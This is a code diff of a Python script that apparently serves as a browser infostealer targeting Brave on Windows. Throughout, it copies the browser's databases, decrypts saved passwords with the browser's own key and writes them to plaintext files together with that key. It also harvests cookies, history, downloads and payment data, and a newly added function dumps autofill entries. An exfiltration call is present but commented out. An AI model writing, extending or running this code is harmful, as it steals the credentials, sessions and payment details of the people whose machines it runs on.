@@ -101,39 +101,40 @@ def decrypt_string(string, key):
 def save_passwords(db_dir, keyDir):
     try:
         db_path = os.path.join(os.environ["USERPROFILE"], db_dir)
-    except:
-        sys.exit(0)
-    file = "passwords.db"
-    try:
+        file = "passwords.db"
+    
         shutil.copyfile(db_path, file)
-    except:
-        sys.exit(0)
+
+        conn = sqlite3.connect(file)
+        cursor = conn.cursor()
+        query = "SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins "" order by date_last_used"
         
-    db = sqlite3.connect(file)
-    cursor = db.cursor()
+        cursor.execute(query)
+    except:
+        return
+    try:
+        for row in cursor.fetchall():
+            main_url = row[0]
+            login_url = row[1]
+            username = row[2]
+            date_created = row[4]
+            last_usage = row[5]
 
-    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "" order by date_last_used")
+            if username or decrypt_string(row[3], fetch_key(keyDir)):
+                data = f"\nAction URL: {main_url}\nLogin URL: {login_url}\nUsername: {username}\nPassword: {decrypt_string(row[3], fetch_key(keyDir))}\nDate of creation: {date_created}\nLast usage: {last_usage}\n"
+                store_data("passwords.txt", data)
+            else:
+                continue
 
-    for row in cursor.fetchall():
-        main_url = row[0]
-        login_url = row[1]
-        username = row[2]
-        date_created = row[4]
-        last_usage = row[5]
+        with open("passwords.txt", "a", encoding="utf-8") as f:
+            f.write(f"\n################==Encryption-Key==################\n{fetch_key(keyDir)}")
 
-        if username or decrypt_string(row[3], fetch_key(keyDir)):
-            data = f"\nAction URL: {main_url}\nLogin URL: {login_url}\nUsername: {username}\nPassword: {decrypt_string(row[3], fetch_key(keyDir))}\nDate of creation: {date_created}\nLast usage: {last_usage}\n"
-            store_data("passwords.txt", data)
-        else:
-            continue
-
-    with open("passwords.txt", "a", encoding="utf-8") as f:
-        f.write(f"\n################==Encryption-Key==################\n{fetch_key(keyDir)}")
-
-    cursor.close()
-    db.close()
-    delete_file(file)
-    #send("passwords.txt")
+        cursor.close()
+        conn.close()
+        delete_file(file)
+        #send("passwords.txt")
+    except:
+        pass
 
 save_passwords(r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data", r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
 
@@ -150,7 +151,7 @@ def fetch_cookies(dir):
         query = 'SELECT name, value, host_key, path, expires_utc, is_secure, is_httponly, creation_utc FROM cookies'
         cursor = conn.execute(query)
     except:
-        pass
+        return
     try:
         for row in cursor:
             name, value, host_key, path, expires_utc, is_secure, is_httponly, creation_utc = row
@@ -177,7 +178,7 @@ def d_fetch_cookies(dir, keyDir):
         query = 'SELECT name, encrypted_value, host_key, path, expires_utc, is_secure, is_httponly, creation_utc FROM cookies'
         cursor = conn.execute(query)
     except:
-        pass
+        return
     key = fetch_key(keyDir)
     try:
         for row in cursor:
@@ -205,7 +206,7 @@ def fetch_history(dir):
         query = "SELECT url, title, visit_count, typed_count, last_visit_time FROM urls"
         cursor = conn.execute(query)
     except:
-        pass
+        return
     
     try:
         for row in cursor:
@@ -234,7 +235,7 @@ def fetch_downloads(dir):
         query = "SELECT target_path, total_bytes, end_time, opened, tab_url FROM downloads"
         cursor = conn.execute(query)
     except:
-        pass
+        return
     
     try:
         for row in cursor:
@@ -323,3 +324,32 @@ def fetch_payment(dir, keyDir):
         pass
 
 fetch_payment(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data", r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
+
+##
+##Extract autofill
+##
+
+def fetch_autofill(dir):
+    try:
+        file = os.path.join(os.environ["USERPROFILE"], dir)
+        shutil.copy(file, "autofill.db")
+        
+        conn = sqlite3.connect("autofill.db")
+        query = "SELECT name, value, date_created, date_last_used FROM autofill"
+        cursor = conn.execute(query)
+    except:
+        return
+    
+    try:
+        for row in cursor:
+            name, value, date_created, date_last_used = row
+            
+            autofill = f"\nName: {name}\nValue: {value}\nCreated: {date_created}\nLast Used: {date_last_used}\n"
+            store_data("autofill.txt", autofill)
+        conn.close()
+        delete_file("autofill.db")
+    except:
+        pass
+    
+    
+fetch_autofill(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data")
